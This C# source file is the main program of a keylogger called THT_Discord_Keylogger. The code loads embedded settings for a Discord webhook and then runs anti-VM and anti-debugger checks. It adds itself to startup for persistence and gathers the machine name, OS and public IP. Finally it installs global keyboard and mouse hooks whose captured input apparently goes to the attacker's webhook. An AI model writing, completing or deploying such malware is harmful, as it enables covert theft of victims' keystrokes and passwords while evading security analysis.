using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace THT_Discord_Keylogger
{
    class Program
    {
        public static Discord discord;
        static void start_hooks()
        {
            KeyboardHook.setup_hook();
            MouseHook.setup_hook();
            discord.become_online();

            SystemMessageThread.run_message_loop();
        }

        static void Main(string[] args)
        {
            Settings.discord_webhook = Utils.read_resource("webhook");
            Settings.buffer_threshold = Convert.ToInt32(Utils.read_resource("treshold"));
            Settings.use_anti_debugger = Convert.ToInt32(Utils.read_resource("dbg"));
            Settings.use_anti_vm = Convert.ToInt32(Utils.read_resource("vm"));
            Settings.add_to_startup = Convert.ToInt32(Utils.read_resource("startup"));

            if (Settings.use_anti_vm == 1)
            {
                Protectors.check_wm();
            }

            if (Settings.use_anti_debugger == 1)
            {
                Protectors.run_check_debugger_thread();
            }

            if (Settings.add_to_startup == 1)
            {
                Utils.add_to_startup();
            }

            string pub_ip = Discord.get_public_ip();

            while (pub_ip == null)
            {
                Thread.Sleep(20000);
                pub_ip = Discord.get_public_ip();
            }

            discord = new Discord(
                Settings.discord_webhook,
                Utils.get_machine_name(),
                Utils.get_machine_name(),
                Utils.get_os_name(),
                new Random().Next(10000, 16777215)
                );

            start_hooks();
        }
    }
}
